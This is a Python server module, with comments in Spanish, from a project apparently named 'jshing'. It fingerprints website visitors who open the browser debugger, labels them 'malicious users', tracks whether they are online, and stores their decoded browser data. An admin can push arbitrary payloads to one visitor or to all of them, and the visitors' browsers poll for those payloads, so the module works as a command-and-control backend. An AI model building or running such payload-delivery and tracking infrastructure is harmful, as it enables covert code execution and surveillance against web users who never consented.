from mongita import MongitaClientDisk

# Importaciones confictivas por uso de api.py y jshing.py

try: from server.utils import mongita_utils
except ImportError: from utils import mongita_utils

try: from server.config import ABSOLUTE_PATH_BD
except: from config import ABSOLUTE_PATH_BD

import hashlib, base64, json, time

def response_json(status_code: int, data: str, errors: list = []) -> dict:
    return {"status": status_code, "data": data, "errors": errors}

def hash_data(data: str) -> str:
    return hashlib.md5(data.encode("utf-8")).hexdigest()

db = MongitaClientDisk(ABSOLUTE_PATH_BD)
jshing_db = db["jshing_db"]

users = jshing_db["users_malicius"]

# Funcion encargada de analizar si el json que contine los usuarios, estan online o no en base
# al time actual. Mayor a 20 segundos el usuario se desconecto
def __users__online__(user_obj: list | dict) -> dict:

    time_ = time.time()
    def is_online(obj: dict) -> bool:
        
        if "last_connection" not in obj:
            return False

        print("log", time_, obj["last_connection"])
        user_now = time_ - obj["last_connection"]

        if user_now > 20:
            return False
        
        elif user_now < 20:
            return True
        
        return False

    if isinstance(user_obj, list):
        
        new_return = []

        for user in user_obj:

            user["online"] = is_online(user)
            new_return.append(user)

        return new_return
    
    user_obj["online"] = is_online(user_obj)
    return user_obj

def registrar_usuario_m(informacion_usuario: str) -> dict:

    # Se hashea la informacion del navegador que envia el usuario cuando abre debuger
    uuid_data = hash_data(informacion_usuario)
    print(uuid_data)
    # Se comprueba que esa informacion sea de algun agente malicioso
    existe_usuario_en_db = existe_usuario_m(uuid_data)

    # Si es asi se retorna el uuid_m del agente malicioso
    if existe_usuario_en_db["status"] == 200:
        return response_json(201, uuid_data)

    usuario_registrado = users.insert_one({"uuid_m_data": informacion_usuario, "uuid_m": uuid_data, "last_connection": time.time()})
    if not usuario_registrado.acknowledged:
        return response_json(500, "can't add a new user to bdd")
    
    return response_json(200, uuid_data)

def existe_usuario_m(uuid_m: str) -> dict:

    resultado_busqueda = users.find_one({"uuid_m": uuid_m})

    if not resultado_busqueda:
        return response_json(404, "bad user not exist in bdd")

    resultado_busqueda = mongita_utils.project(resultado_busqueda, {"_id": 0})
    resultado_busqueda = __users__online__(resultado_busqueda)

    return response_json(200, resultado_busqueda)


#### Seccion malicioso usuario

def obtener_payload_cliente(uuid_m: str) -> dict:

    errors = []

    el_usuario_existe = existe_usuario_m(uuid_m)
    if el_usuario_existe["status"] != 200:
        return el_usuario_existe

    ultima_actualizacion = lambda: time.time() - el_usuario_existe["data"]["last_connection"]
    if ("last_connection" not in el_usuario_existe["data"]) or ultima_actualizacion() >= 10:
        
        resultado = users.update_one({"uuid_m": uuid_m}, {"$set": {"last_connection": time.time()}})
        if not resultado.modified_count:
            errors.append("No se logro actualizar la ultima conexion")

    if "payload" not in el_usuario_existe["data"]:
        return response_json(404, "not payload exists")
    
    return response_json(200, el_usuario_existe["data"]["payload"], errors)
    
########### Seccion admin
def insertar_payload(uuid_m: str, payload: str) -> dict:


    ####################################################
    #       Si la mod es para todos los usuarios       #
    ####################################################

    if uuid_m == "all":

        payload_users = users.update_many({}, {"$set": {"payload": payload}})
        total_users = payload_users.modified_count

        return response_json(
            200, f"Payload cargado a {total_users}."
        )


    ####################################################
    #    Si la modificacion es para un solo usuario    #
    ####################################################

    usuario_existe = existe_usuario_m(uuid_m)
    if usuario_existe["status"] != 200:
        return usuario_existe
    
    resultado = users.update_one({"uuid_m": uuid_m}, {"$set": {"payload": payload}})
    
    if not resultado.modified_count:
        return response_json(404, f"can't add payload to {uuid_m}")

    # se obtiene la informacion del usuario para saber si esta online y se retorna
    user_info = mongita_utils.project(existe_usuario_m(uuid_m)["data"], {"payload": 0, "uuid_m_data": 0})

    return response_json(200, user_info)


def obtener_usuarios_maliciosos() -> dict:

    malicius_users = list(users.find({}))
    malicius_users = mongita_utils.project(malicius_users, {"_id": 0})
    malicius_users = __users__online__(malicius_users)

    if not malicius_users:
        return response_json(404, "not malicius users")
    
    return response_json(200, malicius_users)

def obtener_info_usuario_malicioso(uuid_m: str) -> dict:

    usuario_existe = existe_usuario_m(uuid_m)

    if usuario_existe["status"] != 200:
        return usuario_existe

    data_base_64 = usuario_existe["data"]["uuid_m_data"].strip()
    data_decoded = json.loads(base64.b64decode(data_base_64).decode("utf-8", errors="ignore"))

    usuario_existe["data"]["uuid_m_data"] = data_decoded
    return usuario_existe